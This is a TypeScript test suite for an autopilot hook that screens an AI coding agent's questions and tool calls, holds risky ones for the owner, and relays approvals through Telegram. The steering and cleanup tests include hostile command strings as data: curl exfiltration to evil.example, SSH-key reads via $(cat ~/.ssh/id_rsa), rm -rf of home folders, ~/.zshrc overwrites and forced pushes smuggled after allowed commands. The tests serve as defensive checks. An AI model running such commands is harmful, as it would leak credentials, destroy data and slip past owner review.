import { expect, test } from 'claude-code/testing'

import {
  autopilotPrompt, buildToolRequest, classify, DEFAULTS, fmInternal, decideFmHold, decideQuestions, decideStall, describeAction, fmAnswerLine, fmHoldsFrom,
  finishedMessage, fleetMessage, fleetNotice, fmFleetState, tempCleanup, fmLandedFrom, isReadOnlyTool, judgeTool, landedMessage, roleOf, stateNotice, toolKey,
  inboxPrompt, plainText, replyTarget, telegramReply, tgReplyNote, nudgeText, approvalValid, FIRSTMATE_INTERNAL, FIRSTMATE_TEMP_ROOTS, TEMP_ROOTS,
} from '../hooks/core'
import type { Question } from '../hooks/core'

const cfg = { minConfidence: 0.5, stakesThreshold: 0.5, holdThreshold: 0.5 }
const q: Question = {
  question: 'Which database?',
  header: 'DB',
  multiSelect: false,
  options: [{ label: 'Postgres' }, { label: 'SQLite' }],
}
const choice = (choice: string, confidence: number) => ({
  type: 'choice' as const, choice, confidence, probabilities: {},
})

test('low-stakes confident question is auto-answered', () => {
  const d = decideQuestions([q], { stakes: { type: 'noul', noul: 0.1 }, q0: choice('o1', 0.9) }, cfg)
  expect(d).toEqual({ kind: 'auto', answers: { 'Which database?': 'SQLite' }, confidence: 0.9, stakes: 0.1, review: false })
})

test('low-confidence answer is flagged for review', () => {
  const d = decideQuestions([q], { stakes: { type: 'noul', noul: 0.1 }, q0: choice('o0', 0.3) }, cfg)
  expect(d.kind === 'auto' && d.review).toBe(true)
})

test('high-stakes question escalates with a suggestion', () => {
  const d = decideQuestions([q], { stakes: { type: 'noul', noul: 0.8 }, q0: choice('o0', 0.9) }, cfg)
  expect(d).toEqual({ kind: 'escalate', reason: 'high-stakes', stakes: 0.8, suggested: { 'Which database?': 'Postgres' } })
})

test('tool call is held when destructive or outward-facing', () => {
  const noul = (destructive: number, outward: number) => ({
    destructive: { type: 'noul' as const, noul: destructive },
    outward: { type: 'noul' as const, noul: outward },
  })
  expect(judgeTool(noul(0.86, 0.1), cfg)).toEqual({ risk: 'destructive', pDanger: 0.86, hold: true })
  expect(judgeTool(noul(0.1, 0.7), cfg)).toEqual({ risk: 'outward', pDanger: 0.7, hold: true })
  expect(judgeTool(noul(0.1, 0.05), cfg)).toEqual({ risk: 'safe', pDanger: 0.1, hold: false })
})

test('hold line defaults to 0.65; other thresholds unchanged', () => {
  expect(DEFAULTS).toEqual({ minConfidence: 0.7, stakesThreshold: 0.5, holdThreshold: 0.65 })
  const outward = (p: number) => ({ destructive: { type: 'noul' as const, noul: 0 }, outward: { type: 'noul' as const, noul: p } })
  expect(judgeTool(outward(0.63), DEFAULTS).hold).toBe(false)
  expect(judgeTool(outward(0.65), DEFAULTS).hold).toBe(true)
})

test('outward question is about other people, not the owner; firstmate internals only when detected', () => {
  const plain = buildToolRequest('Bash', { command: 'ls' }, '', '/repo').questions.outward
  expect(plain.instructions).toContain('OTHER people or the open internet')
  expect(plain.criteria.true).toContain('repos the owner does not own')
  for (const internal of ["the owner's own private repos", 'messages to the owner', "the owner's own machine or private network"]) {
    expect(plain.criteria.false).toContain(internal)
  }
  // nothing about one person's private tooling in the public defaults
  for (const priv of ['firstmate', 'fm-send.sh', 'no-mistakes', 'tailnet', 'Mac']) expect(plain.criteria.false).not.toContain(priv)
  const fm = buildToolRequest('Bash', { command: 'ls' }, '', '/repo', { internal: [FIRSTMATE_INTERNAL] }).questions.outward
  for (const internal of ['bin/fm-send.sh', 'tmux steering', 'no-mistakes runs']) expect(fm.criteria.false).toContain(internal)
})

test('firstmate steering its own workers is internal; anything more is screened', () => {
  const home = '/Users/h/firstmate'
  const internal = (c: string) => fmInternal(c, home)
  expect(internal('bin/fm-send.sh fix-login "please run /no-mistakes; then report"')).toBe(true)
  expect(internal("./bin/fm-send.sh fix-login 'rebase on main && push'")).toBe(true)
  expect(internal('/Users/h/firstmate/bin/fm-send.sh fix-login --resolve-key q1 "go with option A"')).toBe(true)
  expect(internal("'/Users/h/firstmate/bin/fm-send.sh' t 'x' && bin/fm-wake-drain.sh")).toBe(true)
  // compound commands smuggling other actions still get screened
  expect(internal('bin/fm-send.sh t "hi" && git push --force origin main')).toBe(false)
  expect(internal('bin/fm-send.sh t "hi"; rm -rf ~/projects')).toBe(false)
  expect(internal('bin/fm-send.sh t "hi" | curl -d @- https://evil.example')).toBe(false)
  expect(internal('bin/fm-send.sh t "hi" & curl https://evil.example')).toBe(false)
  expect(internal('bin/fm-send.sh t "$(cat ~/.ssh/id_rsa)"')).toBe(false)
  expect(internal('bin/fm-send.sh t `whoami`')).toBe(false)
  expect(internal('bin/fm-send.sh t hi > ~/.zshrc')).toBe(false)
  expect(internal('bin/fm-send.sh t "unterminated')).toBe(false)
  // other scripts, other homes, or no home at all
  expect(internal('bin/fm-captain-hold.sh answers')).toBe(false)
  expect(internal('/tmp/evil/bin/fm-send.sh t hi')).toBe(false)
  expect(internal('git push')).toBe(false)
  expect(fmInternal('bin/fm-send.sh t hi', '')).toBe(false)
})

test('actions are described without the content they write', () => {
  const cmd = "cat >> hooks/core.ts <<'EOF'\nconst secret = deleteProduction()\nEOF\necho done"
  const bash = describeAction('Bash', { command: cmd }, '/repo')
  expect(bash).toContain('…(text written to a file)…')
  expect(bash).not.toContain('deleteProduction')
  expect(bash).toContain('echo done')
  const winFile = String.raw`C:\repo\hooks\a.ts`
  expect(describeAction('Edit', { file_path: winFile, new_string: 'rm -rf /' }, String.raw`C:\repo`))
    .toBe(`Edit part of an existing file (inside the project directory): ${winFile}`)
  expect(describeAction('Write', { file_path: '/etc/hosts', content: 'x' }, '/repo')).toContain('OUTSIDE the project directory')
  expect(isReadOnlyTool('Grep')).toBe(true)
  expect(isReadOnlyTool('Bash')).toBe(false)
})

test('telegram updates are classified, strangers only pair', () => {
  const chat = { id: 42, type: 'private' }
  expect(classify({ update_id: 1, callback_query: { id: 'c', data: 'abc:0:1', message: { message_id: 7, chat } } }, '42'))
    .toEqual({ kind: 'button', reqId: 'abc', slot: 0, option: 1, callbackId: 'c', messageId: 7 })
  expect(classify({ update_id: 2, message: { message_id: 8, text: 'use sqlite', chat, reply_to_message: { message_id: 7 } } }, '42'))
    .toEqual({ kind: 'reply', replyTo: 7, text: 'use sqlite', messageId: 8 })
  expect(classify({ update_id: 3, message: { message_id: 9, text: '/status', chat } }, '42'))
    .toEqual({ kind: 'command', command: 'status', args: '', messageId: 9 })
  expect(classify({ update_id: 4, message: { message_id: 10, text: 'hey', chat } }, '42'))
    .toEqual({ kind: 'text', text: 'hey', messageId: 10 })
  expect(classify({ update_id: 5, message: { message_id: 11, text: '123456', chat: { id: 99, type: 'private', username: 'sam' } } }, '42'))
    .toEqual({ kind: 'pairing', chatId: '99', text: '123456', private: true, who: '@sam' })
  expect(classify({ update_id: 5, message: { message_id: 11, text: '123456', chat: { id: -99, type: 'group', title: 'Team' } } }, undefined))
    .toMatchObject({ kind: 'pairing', chatId: '-99', private: false, who: 'Team' })
  expect(classify({ update_id: 6, callback_query: { id: 'x', data: 'abc:0:0', message: { message_id: 1, chat: { id: 99 } } } }, '42'))
    .toBeUndefined()
})

test('firstmate role comes from its env vars and home', () => {
  expect(roleOf({ supervisionActor: 'branch', taskId: 't1' }, true)).toBe('supervisor')
  expect(roleOf({ taskId: 't1' }, false)).toBe('worker')
  expect(roleOf({}, true)).toBe('captain')
  expect(roleOf({}, false)).toBe('solo')
})

const snapshot = {
  backlog: {
    records: [
      { id: 'merge-auth', title: 'Merge auth refactor', hold_kind: 'captain', captain_actionable: true, hold_reason: 'Approve merge? Recommend yes, CI green', pr_url: 'https://github.com/x/y/pull/7', body_lines: ['scope matches brief'] },
      { id: 'later', title: 'Deferred', hold_kind: 'captain', captain_actionable: false, hold_reason: 'next week' },
      { id: 'blocked', title: 'Blocked on dep', hold_kind: 'blocked', captain_actionable: false },
    ],
  },
}

test('only live captain holds are picked up', () => {
  const holds = fmHoldsFrom(snapshot)
  expect(holds.map(h => h.id)).toEqual(['merge-auth'])
  expect(holds[0]!.prUrl).toBe('https://github.com/x/y/pull/7')
  expect(holds[0]!.body).toBe('scope matches brief')
})

test('jev takes clear low-stakes calls, sensitive ones always go to the human', () => {
  const [h] = fmHoldsFrom(snapshot)
  const ans = (stakes: number, accept: number) => ({
    stakes: { type: 'noul' as const, noul: stakes },
    accept: { type: 'noul' as const, noul: accept },
  })
  const strict = { ...cfg, minConfidence: 0.7 }
  expect(decideFmHold(h!, ans(0.1, 0.78), strict)).toEqual({ kind: 'auto', confidence: 0.78, stakes: 0.1 })
  expect(decideFmHold(h!, ans(0.7, 0.95), strict).kind).toBe('escalate')
  expect(decideFmHold(h!, ans(0.1, 0.6), strict)).toMatchObject({ kind: 'escalate', reason: 'Jev unsure' })
  expect(decideFmHold(h!, ans(0.1, 0.3), strict)).toMatchObject({ kind: 'escalate', reason: 'Jev would not approve it', lean: 'decline' })
  const sensitive = { ...h!, reason: 'Drop the production users table?' }
  expect(decideFmHold(sensitive, ans(0.05, 0.99), cfg)).toMatchObject({ kind: 'escalate', reason: 'sensitive' })
})

test('answer lines are one clean TSV row', () => {
  expect(fmAnswerLine('merge-auth', 'Approved:\nproceed', 'by\tJev', 'release')).toBe('merge-auth\tApproved: proceed\tby Jev\trelease\n')
})

test('a stalled turn is nudged only when work remains that can proceed', () => {
  const ans = (done: number, proceedable: number, asksHuman = 0) => ({
    done: { type: 'noul' as const, noul: done },
    proceedable: { type: 'noul' as const, noul: proceedable },
    asksHuman: { type: 'noul' as const, noul: asksHuman },
  })
  expect(decideStall(ans(0.1, 0.85, 0.9)).nudge).toBe(true) // waiting on the owner, but other work is open
  expect(decideStall(ans(0.1, 0.2, 0.9))).toMatchObject({ nudge: false, notice: 'waiting' }) // only the owner's call is left
  expect(decideStall(ans(0.9, 0.1))).toMatchObject({ nudge: false, notice: 'finished' })
  // a routine status update asks the owner nothing: no "waiting on you" ping
  expect(decideStall(ans(0.0, 0.0, 0.1))).toMatchObject({ nudge: false, notice: undefined })
  // a so-so "done" isn't announced as finished
  expect(decideStall(ans(0.55, 0.3, 0.2)).notice).toBeUndefined()
})

test('approved held calls match even when the description is reworded, but never across sessions or projects', () => {
  const scope = { sid: 's1', cwd: '/repo' }
  const a = toolKey('Bash', { command: 'rm -rf build', description: 'Clean build output' }, scope)
  const b = toolKey('Bash', { command: 'rm -rf build', description: 'Remove the build folder' }, scope)
  expect(a).toBe(b)
  expect(toolKey('Bash', { command: 'rm -rf dist' }, scope)).not.toBe(a)
  expect(toolKey('Bash', { command: 'rm -rf build' }, { sid: 's2', cwd: '/repo' })).not.toBe(a)
  expect(toolKey('Bash', { command: 'rm -rf build' }, { sid: 's1', cwd: '/other' })).not.toBe(a)
  expect(toolKey('Bash', { command: 'rm -rf build' }, { sid: 's1', cwd: '/repo/' })).toBe(a)
})

test('a phone approval is good until its expiry and nothing else counts', () => {
  expect(approvalValid({ until: 1000 }, 999)).toBe(true)
  expect(approvalValid({ until: 1000 }, 1000)).toBe(false)
  expect(approvalValid(true, 0)).toBe(false) // the old unscoped, never-expiring form
  expect(approvalValid(undefined, 0)).toBe(false)
})

test('autopilot instructions fit the session role and name the owner as configured', () => {
  expect(autopilotPrompt('solo')).toContain('Never end your turn just to wait for the owner')
  expect(autopilotPrompt('solo')).toContain('Never contact the owner directly')
  expect(autopilotPrompt('solo', 'Sam')).toContain('Never end your turn just to wait for Sam')
  expect(autopilotPrompt('captain')).toContain('A held call parks its own task, not the fleet')
  expect(autopilotPrompt('worker', 'Sam')).toContain('needs-decision')
  expect(autopilotPrompt('worker', 'Sam')).toContain('Never contact Sam directly')
  expect(nudgeText('Sam')).toContain("Sam is away, so don't wait on Sam")
  for (const text of [autopilotPrompt('solo'), autopilotPrompt('captain'), autopilotPrompt('worker'), nudgeText(), inboxPrompt([{ messageId: 1, text: 'x', at: 0 }])]) {
    expect(text).not.toMatch(/\bHunter\b/)
    expect(text).not.toMatch(/\b(he|him|his|she|her)\b/)
  }
})

test('landed tasks are the structured rows in Done', () => {
  const landed = fmLandedFrom({
    backlog: {
      records: [
        { id: 'notes-ui', title: 'Notes list UI', state: 'done', structured: true, completion: { verb: 'merged' }, pr_url: 'https://github.com/x/y/pull/12' },
        { id: 'login-bug', title: 'Fix login redirect', state: 'in_flight', structured: true },
        { id: null, state: 'done', structured: false },
      ],
    },
  })
  expect(landed).toEqual([{ id: 'notes-ui', title: 'Notes list UI', verb: 'merged', prUrl: 'https://github.com/x/y/pull/12' }])
  expect(landedMessage(landed[0]!, 'notes-app')).toContain('✅ <b>Landed</b> (merged)')
})

test('end-of-run notices escape and say which kind', () => {
  expect(finishedMessage('finished', 'app', 'All <done>')).toContain('🏁 <b>Finished</b>')
  expect(finishedMessage('finished', 'app', 'All <done>')).toContain('All &lt;done&gt;')
  expect(finishedMessage('waiting', 'app', 'Need your DB call')).toContain('⏸ <b>Everything remaining is waiting on you</b>')
})

test('fleet notices come from the backlog, not chat about paused projects', () => {
  const state = fmFleetState({
    backlog: {
      records: [
        { id: 'upload', title: 'File upload UI', structured: true, current_role: 'worker' },
        { id: 'backend', title: 'Notes app: pick a backend', structured: true, current_role: 'held', hold_kind: 'captain', captain_actionable: true },
      ],
    },
  })
  expect(state).toEqual({ running: ['File upload UI'], waitingOnYou: ['Notes app: pick a backend'] })
  // a task is mid-progress: say nothing, even though another project waits on the owner
  expect(fleetNotice(1, state)).toBeUndefined()
  // the last running task just landed: finished, even with a paused project's call open
  expect(fleetNotice(1, { running: [], waitingOnYou: ['Notes app: pick a backend'] })).toBe('finished')
  // already idle when first read (or after a reload), or still idle: no announcement
  expect(fleetNotice(undefined, { running: [], waitingOnYou: [] })).toBeUndefined()
  expect(fleetNotice(0, { running: [], waitingOnYou: ['Notes app: pick a backend'] })).toBeUndefined()
  expect(fleetMessage('fm', { running: [], waitingOnYou: ['Notes app: pick a backend'] }))
    .toBe('🏁 <b>Finished</b> · <code>fm</code>\nAll running work has landed.\n\nStill waiting on you:\n• Notes app: pick a backend')
})

test('temp scratch cleanup is recognised, real deletions are not', () => {
  const only = (c: string) => tempCleanup(c).onlyCleanup
  expect(only('rm -rf /tmp/build-Ab12')).toBe(true)
  expect(only('D2=$(mktemp -d /tmp/build-XXXX); rm -rf "$D2"')).toBe(true)
  expect(only('cd /repo && rm -rf /var/folders/xy/T/check-123')).toBe(true)
  expect(only('rm -rf "$TMPDIR/check"')).toBe(true)
  // a pipeline's scratch roots count only when configured (Firstmate adds its own)
  expect(only('rm -rf ~/.no-mistakes/worktrees/eafa7b368be3/01M45G62')).toBe(false)
  const fm = (c: string) => tempCleanup(c, [...TEMP_ROOTS, ...FIRSTMATE_TEMP_ROOTS]).onlyCleanup
  expect(fm('rm -rf ~/.no-mistakes/worktrees/eafa7b368be3/01M45G62')).toBe(true)
  expect(fm('rm -rf $HOME/.no-mistakes/evidence/run-1')).toBe(true)
  expect(fm('rm -rf /Users/sam/.no-mistakes/worktrees/abc')).toBe(true)
  expect(fm('rm -rf ~/.no-mistakes/worktrees/')).toBe(false)
  expect(fm('rm -rf ~/.no-mistakes/')).toBe(false)
  expect(tempCleanup('rm -rf /scratch/job-1', ['/scratch/']).onlyCleanup).toBe(true)
  expect(tempCleanup('rm -rf /scratch/job-1', ['/scratch']).onlyCleanup).toBe(true)
  expect(tempCleanup('rm -rf /scratchy/job-1', ['/scratch']).onlyCleanup).toBe(false)
  // not temp, or too broad
  expect(only('rm -rf ~/.claude/mods')).toBe(false)
  expect(only('rm -rf /tmp')).toBe(false)
  expect(only('rm -rf /tmp/*')).toBe(false)
  expect(only('rm -rf /tmp/../etc')).toBe(false)
  expect(only('rm -rf $HOME/projects')).toBe(false)
  // temp cleanup mixed with something else still gets screened, rewritten
  const mixed = tempCleanup('rm -rf /tmp/x && git push --force origin main')
  expect(mixed.onlyCleanup).toBe(false)
  expect(mixed.command).toContain('<temporary scratch dir>')
  expect(mixed.command).toContain('git push --force origin main')
})

test('autopilot state notice fires only on a change from what the session saw', () => {
  expect(stateNotice(undefined, false)).toBeUndefined()
  expect(stateNotice(true, true)).toBeUndefined()
  expect(stateNotice(false, false)).toBeUndefined()
  expect(stateNotice(undefined, true)).toBe('jev-autopilot: autopilot is ON for every session on this machine - the owner is away; decide what you can and ask only true decisions.')
  expect(stateNotice(false, true, 'Sam')).toBe('jev-autopilot: autopilot is now ON for every session on this machine - Sam is away; decide what you can and ask only true decisions.')
  expect(stateNotice(true, false, 'Sam')).toBe('jev-autopilot: autopilot is now OFF for every session on this machine - Sam is back at the terminal.')
})

test('a Telegram reply answers the latest message the owner wrote, never a held-call verdict', () => {
  const msg = (messageId: number, held?: boolean) => ({ messageId, text: `m${messageId}`, at: 0, ...(held ? { held } : {}) })
  expect(replyTarget([msg(1), msg(2)])).toBe(2)
  expect(replyTarget([msg(1), msg(2, true)])).toBe(1)
  expect(replyTarget([msg(3, true)])).toBeUndefined()
  expect(inboxPrompt([msg(1)], 'Sam')).toContain(tgReplyNote('Sam'))
  expect(inboxPrompt([msg(1)], 'Sam')).toContain('Messages from Sam via Telegram'.replace('Messages', 'Message'))
  expect(inboxPrompt([msg(3, true)])).not.toContain(tgReplyNote())
})

test('replies become escaped Telegram HTML', () => {
  const [html] = telegramReply('## Plan\n\n- fix **the** `a<b>` bug & *ship*\n- see [PR](https://x.dev/a?b=1&c="2")\n\n```ts\nif (a < b && c) {}\n```')
  expect(html).toBe(
    '<b>Plan</b>\n\n• fix <b>the</b> <code>a&lt;b&gt;</code> bug &amp; <i>ship</i>\n' +
    '• see <a href="https://x.dev/a?b=1&amp;c=&quot;2&quot;">PR</a>\n\n<pre>if (a &lt; b &amp;&amp; c) {}</pre>',
  )
  expect(telegramReply('x = 2 * 3 * 4, my_var_name, **open')).toEqual(['x = 2 * 3 * 4, my_var_name, **open'])
  expect(plainText(html!)).toContain('fix the a<b> bug & ship')
  expect(telegramReply('  \n')).toEqual([])
})

test('long replies split within the limit and are cut past the message cap', () => {
  const para = (c: string) => `${c.repeat(300)} <&>`
  const md = Array.from({ length: 20 }, (_, i) => para(String.fromCharCode(97 + i))).join('\n\n')
  const parts = telegramReply(md, 1000, 10)
  expect(parts.length).toBeGreaterThan(1)
  for (const p of parts) expect(p.length).toBeLessThanOrEqual(1000)
  expect(parts.map(plainText).join('\n\n')).toBe(md)

  const code = telegramReply('```\n' + '<'.repeat(5000) + '\n```', 1000, 40)
  for (const p of code) {
    expect(p.length).toBeLessThanOrEqual(1000)
    expect(p.startsWith('<pre>') && p.endsWith('</pre>')).toBe(true)
  }
  expect(code.map(plainText).join('')).toBe('<'.repeat(5000))

  const cut = telegramReply(md, 1000, 2)
  expect(cut.length).toBe(2)
  expect(cut[1]).toContain('full reply is in the terminal')
  expect(cut[1]!.length).toBeLessThanOrEqual(1000)
})
